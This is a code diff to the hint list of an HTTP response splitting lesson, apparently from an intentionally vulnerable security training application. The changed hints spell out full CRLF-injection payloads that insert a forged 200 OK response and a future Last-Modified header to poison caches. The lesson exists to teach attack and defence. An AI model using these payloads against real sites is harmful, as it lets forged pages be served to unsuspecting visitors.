@@ -224,19 +224,19 @@ public class HttpSplitting extends SequentialLessonAdapter
 
 		List<String> hints = new ArrayList<String>();
 		hints.add("Enter a language for the system to search by.");
-		hints.add("Use CR (%0d) and LF (%0a) for a new line");
+		hints.add("Use CR (%0d) and LF (%0a) for a new line in Windows and only LF (%0a) in Linux.");
 		hints.add("The Content-Length: 0 will tell the server that the first request is over.");
 		hints.add("A 200 OK message looks like this: HTTP/1.1 200 OK");
 		hints
-				.add("Try: language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;");
+				.add("NOTE: THIS HINT IS FOR WINDOWS AND HAS TO BE ALTERED FOR ANOTHER SYSTEM <br/> Try: language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;");
 		hints
 				.add("Cache Poisoning starts with including 'Last-Modified' header in the hijacked page and setting it to a future date.");
 		hints
-				.add("Try language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;");
+				.add("NOTE: THIS HINT IS FOR WINDOWS AND HAS TO BE ALTERED FOR ANOTHER SYSTEM <br/>Try language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202030%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;");
 		hints
 				.add("'Last-Modified' header forces the browser to send a 'If-Modified-Since' header. Some cache servers will take the bait and keep serving the hijacked page");
 		hints
-				.add("Try to intercept the reply and add HTTP/1.1 304 Not Modified0d%0aDate:%20Mon,%2027%20Oct%202030%2014:50:18%20GMT");
+				.add("NOTE: THIS HINT IS FOR WINDOWS AND HAS TO BE ALTERED FOR ANOTHER SYSTEM <br/>Try to intercept the reply and add HTTP/1.1 304 Not Modified0d%0aDate:%20Mon,%2027%20Oct%202030%2014:50:18%20GMT");
 		return hints;
 
 	}
